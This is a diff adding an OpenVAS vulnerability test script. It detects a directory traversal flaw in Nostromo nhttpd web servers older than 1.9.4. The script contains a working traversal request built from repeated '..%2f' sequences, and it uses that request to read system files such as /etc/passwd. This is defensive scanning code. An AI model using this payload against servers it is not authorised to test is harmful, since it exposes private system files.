@@ -1,0 +1,96 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: gb_nostromo_nhttpd_web_server_dir_trav_vuln.nasl 5390 2017-02-21 18:39:27Z mime $
+#
+# Nostromo nhttpd Webserver Directory Traversal Vulnerability
+#
+# Authors:
+# Veerendra G.G <veerendragg@secpod.com>
+#
+# Copyright:
+# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License version 2
+# (or any later version), as published by the Free Software Foundation.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+if(description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.802010");
+  script_version("$Revision: 5390 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
+  script_tag(name:"creation_date", value:"2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)");
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
+  script_name("Nostromo nhttpd Webserver Directory Traversal Vulnerability");
+
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/517026/100/0/threaded");
+  script_xref(name:"URL", value:"http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/-nostromo-nhttpd-directory-traversal-leading-to-arbitrary-command-execution");
+
+  script_summary("Check for directory traversal vulnerability in Nostromo nhttpd Web Server");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
+  script_family("Web Servers");
+  script_require_ports("Services/www", 80, 8080);
+  script_dependencies("gb_get_http_banner.nasl");
+  script_mandatory_keys("nostromo/banner");
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory traversal
+  attacks and read arbitrary files on the affected application.
+
+  Impact Level: Application");
+  script_tag(name:"affected", value:"Nostromo nhttpd Version prior to 1.9.4");
+  script_tag(name:"insight", value:"The flaw is due to an error in validating '%2f..' sequences in the
+  URI causing attackers to read arbitrary files.");
+  script_tag(name:"solution", value:"Upgrade to Nostromo nhttpd to 1.9.4 or later,
+  For updates refer to http://www.nazgul.ch/dev_nostromo.html");
+  script_tag(name:"summary", value:"The host is running Nostromo nhttpd web server and is prone to
+  directory traversal vulnerability.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+
+  exit(0);
+}
+
+
+include("http_func.inc");
+include("http_keepalive.inc");
+
+## Get HTTP Port
+port = get_http_port(default:80);
+
+## Confirm the application before trying exploit
+banner = get_http_banner(port: port);
+if("Server: nostromo" >!< banner) {
+  exit(0);
+}
+
+files = traversal_files("linux");
+
+foreach file(keys(files)) {
+
+  ## Iterate Over Possible Attack Requests
+  path = "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/" + files[file];
+
+  ## Check for patterns present in /etc/passwd file in the response
+  if(http_vuln_check(port:port, url:path, pattern:file,
+                     check_header:TRUE)) {
+    report = report_vuln_url(port:port, url:path);
+    security_message(port:port, data:report);
+    exit(0);
+  }
+}
+
+exit(99);
